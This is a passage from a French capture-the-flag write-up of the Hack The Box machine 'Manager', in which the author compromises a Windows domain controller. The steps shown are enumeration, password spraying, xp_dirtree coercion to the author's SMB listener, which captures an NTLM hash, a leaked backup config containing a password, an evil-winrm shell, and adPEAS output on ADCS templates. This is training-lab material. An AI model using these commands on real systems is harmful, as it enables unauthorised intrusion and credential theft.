5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info:\n|   10.10.11.236:1433:\n|     Target_Name: MANAGER\n|     NetBIOS_Domain_Name: MANAGER\n|     NetBIOS_Computer_Name: DC01\n|     DNS_Domain_Name: manager.htb\n|     DNS_Computer_Name: dc01.manager.htb\n|     DNS_Tree_Name: manager.htb\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Issuer: commonName=SSL_Self_Signed_Fallback\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-02-22T07:50:26\n| Not valid after:  2054-02-22T07:50:26\n| MD5:   85f5:4fb8:7578:78df:69cf:b054:b2e7:29cc\n| SHA-1: 7523:daf4:c653:0918:f90e:036c:a73a:5019:1ff0:4793\n| -----BEGIN CERTIFICATE-----\n| MIIDADCCAeigAwIBAgIQNacWjVih9JNNmmJkQkeUsTANBgkqhkiG9w0BAQsFADA7\n##SNIP##\n| aYA/nOd7X6y07FoTCee6uFRAo89Q6TJO0YrkDjLYFx/IWxkPYugo6XX/WHNXzgJz\n| 94C4VA==\n|_-----END CERTIFICATE-----\n| ms-sql-info:\n|   10.10.11.236:1433:\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.\n3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        syn-ack .NET Message Framing\n49667/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49671/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49683/tcp open  tcpwrapped    syn-ack\n49732/tcp open  msrpc         syn-ack Microsoft Windows RPC\n64099/tcp open  msrpc         syn-ack Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>On ajoute le domaine \u00e0 notre fichier /etc/hosts:</p> <pre><code>10.10.11.236  manager.htb dc01.manager.htb\n</code></pre> <p>Je tente ensuite d'\u00e9num\u00e9rer les sous-domaines:</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.136 -H \"HOST: FUZZ.manager.htb\" \n</code></pre> <p>Mais sans r\u00e9sultat. Un dig du DNS ne renvoie rien non plus, et un feroxbuster du site ne donne rien de particulier:</p> <pre><code>pak@DESKTOP-AF1CU53:~$ feroxbuster -u http://manager.htb -w /usr/share/wordlists/dirb/big.txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.10.1\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://manager.htb\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/dirb/big.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.1\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      224l      650w     7900c http://manager.htb/service.html\n200      GET      507l     1356w    18203c http://manager.htb/index.html\n200      GET       10l       42w     2704c http://manager.htb/images/call-o.png\n200      GET        4l       20w     1337c http://manager.htb/images/s-2.png\n200      GET        6l       22w     1052c http://manager.htb/images/location.png\n200      GET      165l      367w     5317c http://manager.htb/contact.html\n200      GET        9l       31w     2492c http://manager.htb/images/s-3.png\n200      GET        6l       20w     1360c http://manager.htb/images/location-o.png\n200      GET        9l       41w     2465c http://manager.htb/images/s-4.png\n200      GET      157l      414w     5386c http://manager.htb/about.html\n200      GET        6l       17w     1553c http://manager.htb/images/s-1.png\n200      GET        7l       29w     1606c http://manager.htb/images/envelope-o.png\n200      GET      614l     1154w    11838c http://manager.htb/css/style.css\n200      GET       10l       43w     2023c http://manager.htb/images/call.png\n200      GET       85l      128w     1389c http://manager.htb/css/responsive.css\n200      GET       14l       48w     3837c http://manager.htb/images/logo.png\n200      GET        9l       25w     1255c http://manager.htb/images/envelope.png\n200      GET      149l      630w    53431c http://manager.htb/images/client.jpg\n200      GET       82l      542w    56157c http://manager.htb/images/contact-img.jpg\n200      GET     4437l    10999w   131863c http://manager.htb/js/bootstrap.js\n200      GET        2l     1276w    88145c http://manager.htb/js/jquery-3.4.1.min.js\n200      GET    10038l    19587w   192348c http://manager.htb/css/bootstrap.css\n403      GET       29l       92w     1233c http://manager.htb/css/\n403      GET       29l       92w     1233c http://manager.htb/images/\n403      GET       29l       92w     1233c http://manager.htb/js/\n200      GET     1313l     7384w   563817c http://manager.htb/images/about-img.png\n200      GET      507l     1356w    18203c http://manager.htb/\n301      GET        2l       10w      149c http://manager.htb/Images =&gt; http://manager.htb/Images/\n301      GET        2l       10w      146c http://manager.htb/css =&gt; http://manager.htb/css/\n301      GET        2l       10w      149c http://manager.htb/images =&gt; http://manager.htb/images/\n301      GET        2l       10w      145c http://manager.htb/js =&gt; http://manager.htb/js/\n</code></pre> <p>On regarde du c\u00f4t\u00e9 de smb, pour voir si \u00e9ventuellement on aurait acc\u00e8s \u00e0 un partage particulier : <pre><code>pak@DESKTOP-AF1CU53:~$ smbclient -L 10.10.11.236\nPassword for [WORKGROUP\\pak]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        SYSVOL          Disk      Logon server share\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre></p> <p>Bon, \u00e0 premi\u00e8re vue il ne reste pas \u00e9norm\u00e9ment de solutions. Je tente une \u00e9num\u00e9ration d'utilisateur via kerbrute:</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ ./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 02/22/24 - Ronnie Flathers @ropnop\n\n2024/02/22 02:03:43 &gt;  Using KDC(s):\n2024/02/22 02:03:43 &gt;   dc01.manager.htb:88\n\n2024/02/22 02:03:43 &gt;  [+] VALID USERNAME:       ryan@manager.htb\n2024/02/22 02:03:45 &gt;  [+] VALID USERNAME:       guest@manager.htb\n2024/02/22 02:03:45 &gt;  [+] VALID USERNAME:       cheng@manager.htb\n2024/02/22 02:03:46 &gt;  [+] VALID USERNAME:       raven@manager.htb\n2024/02/22 02:03:48 &gt;  [+] VALID USERNAME:       administrator@manager.htb\n2024/02/22 02:03:54 &gt;  [+] VALID USERNAME:       Ryan@manager.htb\n2024/02/22 02:03:55 &gt;  [+] VALID USERNAME:       Raven@manager.htb\n2024/02/22 02:03:58 &gt;  [+] VALID USERNAME:       operator@manager.htb\n2024/02/22 02:04:27 &gt;  [+] VALID USERNAME:       Guest@manager.htb\n2024/02/22 02:04:28 &gt;  [+] VALID USERNAME:       Administrator@manager.htb\n2024/02/22 02:04:48 &gt;  [+] VALID USERNAME:       Cheng@manager.htb\n2024/02/22 02:05:46 &gt;  [+] VALID USERNAME:       jinwoo@manager.htb\n2024/02/22 02:05:57 &gt;  [+] VALID USERNAME:       RYAN@manager.htb\n2024/02/22 02:06:33 &gt;  [+] VALID USERNAME:       RAVEN@manager.htb\n2024/02/22 02:06:35 &gt;  [+] VALID USERNAME:       GUEST@manager.htb\n2024/02/22 02:07:31 &gt;  [+] VALID USERNAME:       Operator@manager.htb\n2024/02/22 02:13:45 &gt;  [+] VALID USERNAME:       OPERATOR@manager.htb\n</code></pre> <p>On voit quelques utilisateurs : ryan, cheng, raven, operator, jinwoo. Je mets ces noms d'utilisateur dans un fichier \"userlist\" pour me faciliter la vie plus tard.</p> <p>On a quelques utilisateurs, on peut tenter de l'asreproasting :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -usersfile userlist -dc-ip 10.10.11.236 manager.htb/\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User cheng doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User raven doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jinwoo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User operator doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre> <p>Rhaaaa... je regarde si je n'ai rien oubli\u00e9 qui pourrait me sauter aux yeux, et pendant ce temps je lance un bruteforce sur ces utilisateurs pour tenter de trouver un mot de passe. C'est bourrin, j'aime pas trop, mais je ne vois rien d'autre d'\u00e9vident. </p> <p>Au bout d'un temps certains, un pass est trouv\u00e9 :).</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u ../tmp/userlist -p /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt\n##SNIP##\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\n</code></pre> <p>operator:operator.... Aller, pourquoi pas.</p> <p>Je confirme ces creds:</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\n</code></pre> <p>Oookay, on a un utilisateur. On peut continuer :) !</p>"},{"location":"Writeup/HTB/Machines/Manager/#operator","title":"Operator","text":"<p>Avec un utilisateur, on peut \u00e9num\u00e9rer les autres. Je ne sais pas si \u00e7a me servira, mais en tout cas \u00e7a va dans ma liste !</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --users\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.236    389    DC01             [+] manager.htb\\operator:operator\nLDAP        10.10.11.236    389    DC01             [*] Total of records returned 13\nLDAP        10.10.11.236    389    DC01             Administrator                  Built-in account for administering the computer/domain\nLDAP        10.10.11.236    389    DC01             Guest                          Built-in account for guest access to the computer/domain\nLDAP        10.10.11.236    389    DC01             krbtgt                         Key Distribution Center Service Account\nLDAP        10.10.11.236    389    DC01             Zhong\nLDAP        10.10.11.236    389    DC01             Cheng\nLDAP        10.10.11.236    389    DC01             Ryan\nLDAP        10.10.11.236    389    DC01             Raven\nLDAP        10.10.11.236    389    DC01             JinWoo\nLDAP        10.10.11.236    389    DC01             ChinHae\nLDAP        10.10.11.236    389    DC01             Operator\n</code></pre> <p>On en profite pour tenter un kerberoasting qui ne donne rien :</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --kerberoasting kerberoasted.txt\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.236    389    DC01             [+] manager.htb\\operator:operator\nLDAP        10.10.11.236    389    DC01             No entries found!\n</code></pre> <p>Et voir si nous avons plus de droits sur les partages :</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator --shares\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\nSMB         10.10.11.236    445    DC01             [+] Enumerated shares\nSMB         10.10.11.236    445    DC01             Share           Permissions     Remark\nSMB         10.10.11.236    445    DC01             -----           -----------     ------\nSMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin\nSMB         10.10.11.236    445    DC01             C$                              Default share\nSMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC\nSMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share\nSMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share\n</code></pre> <p>Rien de bien particulier. Je continue d'\u00e9num\u00e9rer rapidement, et vois que je peux me connecter \u00e0 la base de donn\u00e9es MsSQL. Je pense que la suite se trouvera par ici :)...</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec mssql 10.10.11.236 -u operator -p operator -q 'SELECT name FROM master.dbo.sysdatabases;'\nMSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)\nMSSQL       10.10.11.236    1433   DC01             [+] manager.htb\\operator:operator\nMSSQL       10.10.11.236    1433   DC01             name\nMSSQL       10.10.11.236    1433   DC01             ------\nMSSQL       10.10.11.236    1433   DC01             master\nMSSQL       10.10.11.236    1433   DC01             tempdb\nMSSQL       10.10.11.236    1433   DC01             model\nMSSQL       10.10.11.236    1433   DC01             msdb\n</code></pre> <p>Je me connecte en direct au serveur :</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236\n</code></pre> <p>Ce qui me vient directement comme id\u00e9e l\u00e0-dessus, c'est de lancer responder sur ma machine, utiliser xp_dirtree sur le serveur et voir si j'obtiens une r\u00e9ponse :</p> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; xp_dirtree \\\\10.10.16.10\\fauxpartage\nsubdirectory   depth   file\n------------   -----   ----\nSQL (MANAGER\\Operator  guest@master)&gt;\n</code></pre> <pre><code>DC01$::MANAGER:7e9d3c9bb6415dff:5DA46A928DF5BF19541063C4CB527C17:0101000000000000803FF5899365DA012BF2D85E7EC63FC30000000002000800430033004200420001001E00570049004E002D004300330049005500360050005900320044004600330004003400570049004E002D00430033004900550036005000590032004400460033002E0043003300420042002E004C004F00430041004C000300140043003300420042002E004C004F00430041004C000500140043003300420042002E004C004F00430041004C0007000800803FF5899365DA0106000400020000000800300030000000000000000000000000300000A2CE93D6583FE8B00E95F0C748AA0E517A8E902DA9BF533DD7235C76C21DE6FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000\n</code></pre> <p>Okay, on a un r\u00e9sultat, voyons voir si il est exploitable... Evidemment, non, ce serait beaucoup trop simple :). </p>"},{"location":"Writeup/HTB/Machines/Manager/#xp_dirtree","title":"xp_dirtree","text":"<p>Par contre, xp_dirtree fonctionne donc je peux potentiellement me balader dans les fichiers du serveur:</p> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; EXEC xp_dirtree 'C:\\', 1, 1;\nsubdirectory                depth   file\n-------------------------   -----   ----\n$Recycle.Bin                    1      0\n\nDocuments and Settings          1      0\n\ninetpub                         1      0\n\nPerfLogs                        1      0\n\nProgram Files                   1      0\n\nProgram Files (x86)             1      0\n\nProgramData                     1      0\n\nRecovery                        1      0\n\nSQL2019                         1      0\n\nSystem Volume Information       1      0\n\nUsers                           1      0\n\nWindows                         1      0\n</code></pre> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1;\nsubdirectory                      depth   file\n-------------------------------   -----   ----\nabout.html                            1      1\n\ncontact.html                          1      1\n\ncss                                   1      0\n\nimages                                1      0\n\nindex.html                            1      1\n\njs                                    1      0\n\nservice.html                          1      1\n\nweb.config                            1      1\n\nwebsite-backup-27-07-23-old.zip       1      1\n</code></pre> <p>Un fichier de backup \u00e0 la racine du serveur web, int\u00e9ressant, r\u00e9cup\u00e9rons le :) ! </p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ wget http://manager.htb/website-backup-27-07-23-old.zip\n--2024-02-22 14:06:04--  http://manager.htb/website-backup-27-07-23-old.zip\nResolving manager.htb (manager.htb)... 10.10.11.236\nConnecting to manager.htb (manager.htb)|10.10.11.236|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1045328 (1021K) [application/x-zip-compressed]\nSaving to: \u2018website-backup-27-07-23-old.zip\u2019\n\nwebsite-backup-27-07-23-old.zip    100%[==============================================================&gt;]   1021K  3.78MB/s    in 0.3s\n\n2024-02-22 14:06:05 (3.78 MB/s) - \u2018website-backup-27-07-23-old.zip\u2019 saved [1045328/1045328]\n</code></pre> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ unzip website-backup-27-07-23-old.zip\nArchive:  website-backup-27-07-23-old.zip\n  inflating: .old-conf.xml\n  inflating: about.html\n  inflating: contact.html\n  inflating: css/bootstrap.css\n  inflating: css/responsive.css\n  inflating: css/style.css\n  inflating: css/style.css.map\n  inflating: css/style.scss\n  inflating: images/about-img.png\n  inflating: images/body_bg.jpg\n extracting: images/call.png\n extracting: images/call-o.png\n  inflating: images/client.jpg\n  inflating: images/contact-img.jpg\n extracting: images/envelope.png\n extracting: images/envelope-o.png\n  inflating: images/hero-bg.jpg\n extracting: images/location.png\n extracting: images/location-o.png\n extracting: images/logo.png\n  inflating: images/menu.png\n extracting: images/next.png\n extracting: images/next-white.png\n  inflating: images/offer-img.jpg\n  inflating: images/prev.png\n extracting: images/prev-white.png\n extracting: images/quote.png\n extracting: images/s-1.png\n extracting: images/s-2.png\n extracting: images/s-3.png\n extracting: images/s-4.png\n extracting: images/search-icon.png\n  inflating: index.html\n  inflating: js/bootstrap.js\n  inflating: js/jquery-3.4.1.min.js\n  inflating: service.html\n</code></pre> <p>Tout de suite un fichier me saute aux yeux : .old-conf.xml</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ cat .old-conf.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;ldap-conf xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n   &lt;server&gt;\n      &lt;host&gt;dc01.manager.htb&lt;/host&gt;\n      &lt;open-port enabled=\"true\"&gt;389&lt;/open-port&gt;\n      &lt;secure-port enabled=\"false\"&gt;0&lt;/secure-port&gt;\n      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;\n      &lt;server-type&gt;microsoft&lt;/server-type&gt;\n      &lt;access-user&gt;\n         &lt;user&gt;raven@manager.htb&lt;/user&gt;\n         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;\n      &lt;/access-user&gt;\n      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;\n   &lt;/server&gt;\n   &lt;search type=\"full\"&gt;\n      &lt;dir-list&gt;\n         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;\n      &lt;/dir-list&gt;\n   &lt;/search&gt;\n&lt;/ldap-conf&gt;\n</code></pre> <p>Bingo ! </p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\raven:R4v3nBe5tD3veloP3r!123\n</code></pre> <p>Et un acc\u00e8s \u00e0 WinRM en prime... :)</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt;\n</code></pre>"},{"location":"Writeup/HTB/Machines/Manager/#raven","title":"Raven","text":"<p>Bon, il serait temps de sortir l'AdPEAS :</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; upload /home/pak/Tools/Windows/AD/adPEAS.ps1\n\nInfo: Uploading /home/pak/Tools/Windows/AD/adPEAS.ps1 to C:\\Users\\Raven\\Documents\\adPEAS.ps1\n\nData: 4159704 bytes of 4159704 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; Import-Module .\\adPEAS.ps1\n*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; Invoke-adPEAS\n\n               _ _____  ______           _____\n              | |  __ \\|  ____|   /\\    / ____|\n      ____  __| | |__) | |__     /  \\  | (___\n     / _  |/ _  |  ___/|  __|   / /\\ \\  \\___ \\\n    | (_| | (_| | |    | |____ / ____ \\ ____) |\n     \\__,_|\\__,_|_|    |______/_/    \\_\\_____/\n                                            Version 0.8.13\n\n    Active Directory Enumeration\n    by @61106960\n\n    Legend\n        [?] Searching for juicy information\n        [!] Found a vulnerability which may can be exploited in some way\n        [+] Found some interesting information for further investigation\n        [*] Some kind of note\n        [#] Reserved\n\n\n[?] +++++ Searching for Juicy Active Directory Information +++++\n\n[?] +++++ Checking General Domain Information +++++\n[+] Found general Active Directory domain information for domain 'manager.htb':\nDomain Name:                            manager.htb\nDomain SID:                             S-1-5-21-4078382237-1492182817-2568127209\nDomain Functional Level:                Windows 2016\nForest Name:                            manager.htb\nForest Children:                        No Subdomain[s] available\nDomain Controller:                      dc01.manager.htb\n\n[?] +++++ Checking Domain Policies +++++\n[+] Found password policy of domain 'manager.htb':\nMinimum Password Age:                   1 days\nMaximum Password Age:                   42 days\n[+] Minimum Password Length:            7 character\n[!] Password Complexity:                Disabled\n[!] Lockout Account:                    Disabled\nReversible Encryption:                  Disabled\n[+] Found Kerberos policy of domain 'manager.htb':\nMaximum Age of TGT:                     10 hours\nMaximum Age of TGS:                     600 minutes\nMaximum Clock Time Difference:          5 minutes\nKrbtgt Password Last Set:               07/27/2023 03:19:45\n\n[?] +++++ Checking Domain Controller, Sites and Subnets +++++\n[+] Found domain controller of domain 'manager.htb':\nDC Host Name:                           dc01.manager.htb\nDC Roles:                               SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole\nDC IP Address:                          ::1\nSite Name:                              Default-First-Site-Name\n\n\n[?] +++++ Checking Forest and Domain Trusts +++++\n\n[?] +++++ Checking Juicy Permissions +++++\n\n[?] +++++ Checking Add-Computer Permissions +++++\n[+] Filtering found identities that can add a computer object to domain '':\n[!] Every member of group 'Authenticated Users' can add a computer to domain ''\n\ndistinguishedName:                      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=manager,DC=htb\nobjectSid:                              S-1-5-11\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Certificate Service DCOM Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Users,CN=Builtin,DC=manager,DC=htb\n\n\n[?] +++++ Checking DCSync Permissions +++++\n[+] Filtering found identities that can perform DCSync in domain '':\n\n[?] +++++ Checking LAPS Permissions +++++\n\n[?] +++++ Searching for GPO local group membership Information +++++\n\n[?] +++++ Searching for Active Directory Certificate Services Information +++++\n[+] Found at least one available Active Directory Certificate Service\nadPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2\n\n[+] Found Active Directory Certificate Services 'manager-DC01-CA':\nCA Name:                                manager-DC01-CA\nCA dnshostname:                         dc01.manager.htb\nCA IP Address:                          10.10.11.236\nDate of Creation:                       07/27/2023 10:31:05\nDistinguishedName:                      CN=manager-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nNTAuthCertificates:                     True\nAvailable Templates:                    SubCA\n                                        DirectoryEmailReplication\n                                        DomainControllerAuthentication\n                                        KerberosAuthentication\n                                        EFSRecovery\n                                        EFS\n                                        DomainController\n                                        WebServer\n                                        Machine\n                                        User\n                                        Administrator\n\n[?] +++++ Searching for Vulnerable Certificate Templates +++++\nadPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy\n\n[?] +++++ Checking Template 'SubCA' +++++\n[!] Template 'SubCA' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'\nTemplate Name:                          SubCA\nTemplate distinguishedname:             CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\nEnrollmentFlag:                         0\n[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT\n\n[?] +++++ Checking Template 'DirectoryEmailReplication' +++++\n\n[?] +++++ Checking Template 'DomainControllerAuthentication' +++++\n\n[?] +++++ Checking Template 'KerberosAuthentication' +++++\n\n[?] +++++ Checking Template 'EFSRecovery' +++++\n\n[?] +++++ Checking Template 'EFS' +++++\n[+] Identity 